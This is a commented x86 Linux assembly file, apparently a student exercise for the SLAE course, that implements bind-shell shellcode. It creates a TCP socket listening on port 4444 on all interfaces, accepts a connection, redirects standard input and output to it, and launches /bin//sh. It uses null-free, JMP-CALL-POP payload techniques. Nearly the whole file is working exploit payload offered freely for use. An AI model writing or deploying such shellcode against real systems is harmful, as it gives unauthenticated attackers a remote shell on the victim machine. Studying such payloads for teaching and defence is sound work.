;--------------------------------------------------------------
;
; bind-shell.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
; August 29, 2016
;
; Free to use, distribute, and alter as needed
; 
; #define __NR_socketcall         102 (0x66)
; (/usr/include/i386-linux-gnu/asm/unistd_32.h)
;
; int socketcall(int call, unsigned long *args);
;
; int socket(int domain, int type, int protocol);
;
; #define SYS_SOCKET   1    /* sys_socket(2)
; (/usr/include/linux/net.h)
;
; AF_INET (2)            IPv4 Internet protocols
; SOCK_STREAM (1)  Provides sequenced, reliable, 
; two-way, connection-based byte streams.  
; An out-of-band data transmission mechanism 
; may be supported.
; (man socket 2)
;
; tcp	6  TCP # transmission control protocol
; (cat /etc/protocols)
;
; To accept connections, the following steps are performed:
;
;  1.  A socket is created with socket(2).
;
;  2.  The socket is bound to a local address using bind(2), 
;      so that other sockets may be connect(2)ed to it.
;
;  3.  A willingness to accept incoming connections and a 
;      queue limit for incoming connections are specified with listen().
;
;  4.  Connections are accepted with accept(2).
;
;
; We'll also have to redirect std in, out, error
; through the acceptfd in order to launch
; /bin//sh
;
;---------------------------------------------------------------------------

global _start

section .text

_start:

	; This block sets up our socket EAX will contain the
	; return value. We'll need to use this value later

	push 0x66	; push/pop to setup eax
	pop eax		; push/pop to setup eax
	push 0x1	; push/pop to setup ebx
	pop ebx		; push/pop to setup ebx
	push 0x6	; 3rd parameter TCP protocol to SYS_SOCKET
	push 0x1	; 2nd parameter SOCK_STREAM to SYS_SOCKET
	push 0x2	; 1st parameter AF_INET
	mov ecx, esp	; ecx now contains address to top of stack for parameters
	int 0x80	; execute

	mov edi, eax	; store our return value for later



getsome:


	; JMP CALL POP technique for port should do nicely
	
	jmp short portconfig


call_bind:

	; get the port off of stack and store it temporarily
	; there is some interesting referencing here for
	;
	; int bind(int sockfd, const struct sockaddr *addr,
        ;        socklen_t addrlen)
	; need to handle the struct *addr
	; struct sockaddr {
        ;       sa_family_t sa_family;
        ;       char        sa_data[14];
        ;   }
	;

	pop esi		; this should be our listening port JMP/CALL/POP
	xor eax, eax	; need to zero out eax
	push eax	; we'll need to listen on 0.0.0.0
	push word [esi]	; port pushed onto stack make sure to ONLY push 2 bytes or anger the compiling genies
	mov al, 0x2	; AF_INET IPv4 Internet protocols
	push ax		; now our stack is set up
	mov edx, esp	; store the stack address (of our struct)
	push 0x10	; store length addr on stack
	push edx	; now we need to push the pointer to our struct onto stack
	push edi	; here's our returned socketfd from our SOCKET only 1 byte
	push 0x66	; push/pop to get eax where we need it
	pop eax		; push/pop to get eax where we need it
	push 0x2	; push/pop to get ebx where we need it
	pop ebx		; push/pop to get ebx where we need it
	mov ecx, esp	; parameters for bind, ecx should already be cleaned out
	int 0x80	; call it, 0 will be returned on success

listener:

	; now we need to listen for connections
	;
	; int listen(int sockfd, int backlog);
	;
	; good thing we didn't get rid of edi
	; since we'll need it here and 
	; for accept()

	push 0x66	; push/pop to get eax where we need it
	pop eax		; push/pop to get eax where we need it
	push 0x4	; push/pop to get ebx where we need it
	pop ebx		; push/pop to get ebx where we need it
	push 0x1	; int backlog
	push edi	; int sockfd only a byte
	mov ecx, esp	; parameters into ecx
	int 0x80	; call it

accept_connect:


	; now we accept connections
	; in this case we can use NULL
	; values for addr. 
	; We can be a bit lazier with this one
	;
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;
	;
	; The argument addr is a pointer to a sockaddr structure.  
	; This structure is filled in with the address of the peer 
	; socket, as known to the communications layer.  The exact 
	; format of the address returned addr is determined by the 
	; socket's address family (see socket(2) and the respective 
	; protocol man pages).  When addr is NULL, nothing is filled 
	; in. In this case, addrlen is  not  used, and should also be NULL.
	;

	xor eax, eax	; clean eax
	xor ebx, ebx	; clean ebx
	push eax	; set up null space addrlen
	push ebx	; setup more nullspace for addr
	push edi	; socketfd
	mov al, 0x66	; define __NR_socketcall  102 (0x66)
	mov bl, 0x5	; define SYS_ACCEPT 5 
	mov ecx, esp	; parameters to define SYS_ACCEPT
	int 0x80	; call it, eax will hold the new fd


change_fd:

	; changes std in, out, error to the socket
	; this is necessary for getting /bin/bash
	; through the socket connection
	;
	; we'll use define __NR_dup2	63 (0x3f)
	;
	; int dup2(int oldfd, int newfd)
	;

	mov ebx, eax	; take fd from accept() as oldfd
	xor ecx, ecx	; 0 (std in) in ecx
	push 0x3f	; push/pop to setup eax define __NR_dup2  63 (0x3f)
	pop eax		; push/pop to setup eax
	int 0x80	; call it
	mov al, 0x3f	; define __NR_dup2 63 (0x3f)
	mov cl, 0x1	; 1 (std out) in cl
	int 0x80	; call it
	mov al, 0x3f	; define __NR_dup2 63 (0x3f)
	mov cl, 0x2	; 2 (std error) in cl
	int 0x80	; call it

shell_time:

	; now it's time to launch our shell
	; program using execve. I prefer
	; /bin/bash but it doesn't play
	; well in terms of length so 
	; we'll use /bin//sh for length
	; sake
	;
	; /bin//sh (0x68732f2f) (0x6e69622f)
	; execve is 0xb (11)
	; int execve(const char *filename, char *const argv[],
        ;          char *const envp[])


	xor eax, eax	; clean out eax
	push eax	; need a null byte for execve parameters
	push 0x68732f2f	; hs//
	push 0x6e69622f	; nib/ 
	mov ebx, esp	; save stack pointer in ebx
	push eax	; push another null onto stack
	mov edx, esp	; 0x00/bin//sh0x00
	push ebx	; points to /bin//sh0x00
	mov ecx, esp	; points to 0x00/bin//sh0x00
	mov al, 0xb	; execve
	int 0x80	; call it
	
	


portconfig:

	call call_bind
	portnum dw 0x5c11	; port 4444 (0x115c) don't forget little endian
